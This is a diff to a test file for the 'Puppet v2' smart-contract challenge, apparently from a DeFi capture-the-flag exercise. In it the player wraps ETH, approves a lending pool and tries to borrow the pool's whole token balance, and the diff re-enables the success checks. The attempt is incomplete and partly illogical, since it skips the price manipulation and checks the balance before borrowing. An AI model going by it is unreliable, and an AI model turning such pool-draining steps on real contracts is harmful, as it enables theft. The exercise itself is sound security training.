@@ -93,22 +93,30 @@ describe('[Challenge] Puppet v2', function () {
             {gasLimit: 1e6}
         )
 
+        const playerBalance = await ethers.provider.getBalance(player.address)
+        const wethRequired = await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        await weth.connect(player).deposit(
+            {value: wethRequired }
+        );
+        await weth.connect(player).approve(lendingPool.address, playerBalance);
         const tokenBalance = await token.balanceOf(player.address);
-        const required = await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
-        console.log(tokenBalance.toString());
-        console.log("Required eth", required.toString());
+        const wethBalance = await weth.balanceOf(player.address);
+        console.log("WETH Balance:", wethBalance.toString());
+        console.log("Required WETH:", wethRequired.toString());
+        
+        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);
         expect(tokenBalance).to.be.eq(0);
     });
 
-    // after(async function () {
-    //     /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
-    //     // Player has taken all tokens from the pool        
-    //     expect(
-    //         await token.balanceOf(lendingPool.address)
-    //     ).to.be.eq(0);
+    after(async function () {
+        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
+        // Player has taken all tokens from the pool
+        expect(
+            await token.balanceOf(lendingPool.address)
+        ).to.be.eq(0);
 
-    //     expect(
-    //         await token.balanceOf(player.address)
-    //     ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE);
-    // });
+        expect(
+            await token.balanceOf(player.address)
+        ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE);
+    });
 });
